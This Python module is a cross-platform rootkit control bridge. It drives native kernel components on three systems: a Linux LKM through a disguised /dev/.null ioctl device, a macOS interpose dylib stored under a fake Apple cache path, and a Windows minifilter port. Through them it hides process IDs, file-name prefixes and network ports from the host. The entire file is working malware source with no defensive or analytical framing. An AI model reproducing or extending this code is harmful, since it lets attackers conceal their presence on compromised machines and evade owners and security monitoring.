"""
Cross-platform kernel bridge — ctypes interface to native rootkit modules.

Provides a uniform Python API that talks to the platform-specific
kernel module (Linux LKM, macOS dylib, Windows minifilter) via
the appropriate IPC mechanism:

  - Linux:   ``/dev/.null`` character device + ``fcntl.ioctl()``
  - macOS:   ``ctypes.CDLL("interpose.dylib")`` exported functions
  - Windows: ``FilterSendMessage`` via ctypes

Usage::

    from rootkit.ioctl_bridge import KernelBridge

    bridge = KernelBridge()
    bridge.hide_pid(os.getpid())
    bridge.hide_file_prefix(".cache")
    bridge.hide_port(8443)
"""
from __future__ import annotations

import ctypes
import ctypes.util
import fcntl
import logging
import os
import platform
import struct
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)


def _get_platform() -> str:
    return platform.system().lower()


# ── Linux ioctl command constants (must match hidemod.c) ─────────

_IOC_WRITE = 1
_IOC_NRBITS = 8
_IOC_TYPEBITS = 8
_IOC_SIZEBITS = 14
_IOC_NRSHIFT = 0
_IOC_TYPESHIFT = _IOC_NRSHIFT + _IOC_NRBITS
_IOC_SIZESHIFT = _IOC_TYPESHIFT + _IOC_TYPEBITS
_IOC_DIRSHIFT = _IOC_SIZESHIFT + _IOC_SIZEBITS


def _IOW(type_char: str, nr: int, size: int) -> int:
    """Construct a write ioctl command number (matches kernel _IOW macro)."""
    return (
        (_IOC_WRITE << _IOC_DIRSHIFT)
        | (ord(type_char) << _IOC_TYPESHIFT)
        | (nr << _IOC_NRSHIFT)
        | (size << _IOC_SIZESHIFT)
    )


HIDE_PID    = _IOW('H', 1, 4)               # int
UNHIDE_PID  = _IOW('H', 2, 4)               # int
HIDE_PREFIX = _IOW('H', 3, 256)              # char[256]
HIDE_PORT   = _IOW('H', 4, 2)               # unsigned short
UNHIDE_PORT = _IOW('H', 5, 2)               # unsigned short

_LINUX_DEV_PATH = "/dev/.null"


class KernelBridge:
    """Uniform interface to platform-specific kernel hiding modules.

    Automatically selects the correct backend based on the running OS.
    All methods return ``True`` on success, ``False`` on failure.
    Failures are non-fatal — the caller should degrade gracefully.
    """

    def __init__(self, config: dict[str, Any] | None = None) -> None:
        cfg = config or {}
        self._platform = _get_platform()
        self._dylib_path = str(cfg.get("dylib_path", ""))
        self._loaded = False

        # macOS: ctypes handle to the interpose dylib
        self._dylib: ctypes.CDLL | None = None

        # Linux: file descriptor to /dev/.null
        self._dev_fd: int = -1

    # ── Public API ───────────────────────────────────────────────

    def is_loaded(self) -> bool:
        """Check if the native module is accessible."""
        if self._platform == "linux":
            return os.path.exists(_LINUX_DEV_PATH)
        if self._platform == "darwin":
            return self._get_dylib() is not None
        if self._platform == "windows":
            return self._check_windows_driver()
        return False

    def hide_pid(self, pid: int) -> bool:
        if self._platform == "linux":
            return self._linux_ioctl(HIDE_PID, struct.pack("i", pid))
        if self._platform == "darwin":
            return self._macos_call("interpose_hide_pid", pid)
        if self._platform == "windows":
            return False  # PID hiding via minifilter not implemented
        return False

    def unhide_pid(self, pid: int) -> bool:
        if self._platform == "linux":
            return self._linux_ioctl(UNHIDE_PID, struct.pack("i", pid))
        if self._platform == "darwin":
            return self._macos_call("interpose_unhide_pid", pid)
        return False

    def hide_file_prefix(self, prefix: str) -> bool:
        if self._platform == "linux":
            buf = prefix.encode("utf-8")[:255].ljust(256, b"\x00")
            return self._linux_ioctl(HIDE_PREFIX, buf)
        if self._platform == "darwin":
            return self._macos_call_str("interpose_hide_prefix", prefix)
        if self._platform == "windows":
            return self._windows_hide_prefix(prefix)
        return False

    def hide_port(self, port: int) -> bool:
        if self._platform == "linux":
            return self._linux_ioctl(HIDE_PORT, struct.pack("H", port))
        return False  # Port hiding only on Linux LKM

    def unhide_port(self, port: int) -> bool:
        if self._platform == "linux":
            return self._linux_ioctl(UNHIDE_PORT, struct.pack("H", port))
        return False

    def close(self) -> None:
        """Release resources."""
        if self._dev_fd >= 0:
            try:
                os.close(self._dev_fd)
            except OSError:
                pass
            self._dev_fd = -1
        self._dylib = None

    # ── Linux backend ────────────────────────────────────────────

    def _linux_ioctl(self, cmd: int, arg: bytes) -> bool:
        try:
            fd = self._get_linux_fd()
            if fd < 0:
                return False
            buf = ctypes.create_string_buffer(arg)
            fcntl.ioctl(fd, cmd, buf)
            return True
        except Exception as exc:
            logger.debug("Linux ioctl failed (cmd=0x%x): %s", cmd, exc)
            return False

    def _get_linux_fd(self) -> int:
        if self._dev_fd >= 0:
            return self._dev_fd
        try:
            self._dev_fd = os.open(_LINUX_DEV_PATH, os.O_RDWR)
            return self._dev_fd
        except OSError as exc:
            logger.debug("Cannot open %s: %s", _LINUX_DEV_PATH, exc)
            return -1

    # ── macOS backend ────────────────────────────────────────────

    def _get_dylib(self) -> ctypes.CDLL | None:
        if self._dylib is not None:
            return self._dylib
        # Search paths
        search = [
            self._dylib_path,
            str(Path(__file__).parent / "native" / "macos" / "interpose.dylib"),
            os.path.expanduser("~/.cache/com.apple.dt.instruments/interpose.dylib"),
        ]
        for path in search:
            if path and os.path.isfile(path):
                try:
                    self._dylib = ctypes.CDLL(path)
                    return self._dylib
                except OSError:
                    continue
        return None

    def _macos_call(self, func_name: str, int_arg: int) -> bool:
        try:
            dylib = self._get_dylib()
            if not dylib:
                return False
            func = getattr(dylib, func_name)
            func.argtypes = [ctypes.c_int]
            func.restype = None
            func(int_arg)
            return True
        except Exception as exc:
            logger.debug("macOS dylib call %s failed: %s", func_name, exc)
            return False

    def _macos_call_str(self, func_name: str, str_arg: str) -> bool:
        try:
            dylib = self._get_dylib()
            if not dylib:
                return False
            func = getattr(dylib, func_name)
            func.argtypes = [ctypes.c_char_p]
            func.restype = None
            func(str_arg.encode("utf-8"))
            return True
        except Exception as exc:
            logger.debug("macOS dylib call %s failed: %s", func_name, exc)
            return False

    # ── Windows backend ──────────────────────────────────────────

    @staticmethod
    def _check_windows_driver() -> bool:
        """Check if the minifilter driver is loaded via fltmc."""
        try:
            import subprocess
            result = subprocess.run(
                ["fltmc", "filters"],
                capture_output=True, text=True, timeout=5,
            )
            return "HideFilter" in result.stdout
        except Exception:
            return False

    def _windows_hide_prefix(self, prefix: str) -> bool:
        """Send a HIDE_PREFIX command to the minifilter via FilterSendMessage."""
        try:
            # Encode the command message (must match COMMAND_MSG struct)
            # CMD_HIDE_PREFIX = 1
            cmd = struct.pack("I", 1)  # COMMAND_TYPE
            wide_prefix = prefix.encode("utf-16-le")[:518]  # MAX_PREFIX_LEN * 2
            wide_prefix = wide_prefix.ljust(520, b"\x00")
            msg = cmd + wide_prefix

            # Open communication port
            kernel32 = ctypes.windll.kernel32  # type: ignore[attr-defined]
            fltlib = ctypes.windll.LoadLibrary("fltlib.dll")  # type: ignore[attr-defined]

            port_name = ctypes.create_unicode_buffer("\\HideFilterPort")

            HANDLE = ctypes.c_void_p
            port = HANDLE()

            # FilterConnectCommunicationPort
            hr = fltlib.FilterConnectCommunicationPort(
                port_name, 0, None, 0, None, ctypes.byref(port)
            )
            if hr != 0:
                return False

            # FilterSendMessage
            out_buf = ctypes.create_string_buffer(64)
            bytes_returned = ctypes.c_ulong(0)
            hr = fltlib.FilterSendMessage(
                port,
                ctypes.c_char_p(msg),
                len(msg),
                out_buf,
                64,
                ctypes.byref(bytes_returned),
            )

            kernel32.CloseHandle(port)
            return hr == 0

        except Exception as exc:
            logger.debug("Windows minifilter command failed: %s", exc)
            return False
